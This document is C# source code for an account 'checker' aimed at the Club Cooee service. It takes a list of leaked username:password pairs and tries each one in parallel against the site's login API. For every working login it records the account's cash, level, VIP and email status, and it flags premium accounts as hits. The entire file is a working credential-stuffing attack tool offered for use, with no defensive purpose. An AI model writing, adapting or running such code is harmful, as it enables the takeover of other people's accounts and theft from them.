using Milky.Objects;
using MilkyNet;
using Newtonsoft.Json;
using System;
using System.Threading;
using System.Threading.Tasks;
using static Milky.Output.OutputSettings;

namespace Club_Cooee_Checker
{
    class Program
    {
        [STAThread]
        static void Main(string[] args)
        {
            var Milky = new MilkyManager();
            Milky.ProgramManager.Initialize("Club Cooee Checker", "1.0", "Laiteux", "https://pastebin.com/raw/QW82zeqi");

            Milky.FileUtils.LoadCombos();

            int threads = Milky.UserUtils.AskInteger("Threads");
            Milky.RunSettings.threads = threads;
            ThreadPool.SetMinThreads(threads, threads);

            Milky.ConsoleSettings.SetTitleStyle(true, true);

            Milky.RunManager.StartRun();

            Parallel.ForEach(Milky.RunLists.combos, new ParallelOptions { MaxDegreeOfParallelism = Milky.RunSettings.threads }, combo =>
            {
                var splittedCombo = combo.Split(':');

                var resultType = ResultType.Invalid;
                var captures = new CaptureDictionary();

                if (splittedCombo.Length == 2)
                {
                    var login = Uri.EscapeDataString(splittedCombo[0]);
                    var password = Uri.EscapeDataString(splittedCombo[1]);

                    while (resultType == ResultType.Invalid)
                    {
                        var request = new MilkyRequest();

                        try
                        {
                            request.AddHeader("Content-Type", "application/x-www-form-urlencoded");

                            var response = Milky.RequestUtils.Execute(request,
                                HttpMethod.POST, "https://en.clubcooee.com/api3/auth_login",
                                $"username={login}&password={password}");
                            var source = response.ToString();
                            var json = JsonConvert.DeserializeObject<dynamic>(source);

                            if(!(bool)json.error)
                            {
                                var user = json.msg.userdata.auth;

                                if(login.Contains("@"))
                                    captures.Add("Username", (string)user.name);
                                captures.Add("Cash", (string)user.credits);
                                captures.Add("Level", ((int)user.xp_level).ToString());
                                captures.Add("VIP", ((bool)user.premium).ToString());
                                captures.Add("Confirmed Email", ((bool)user.email_confirmed).ToString());

                                resultType = (bool)user.premium ? ResultType.Hit : ResultType.Free;
                            }

                            break;
                        }
                        catch { }

                        request.Dispose();
                    }
                }

                Milky.RunManager.SubmitComboResult(combo, resultType, captures);
            });

            Milky.RunManager.FinishRun();

            Thread.Sleep(-1);
        }
    }
}
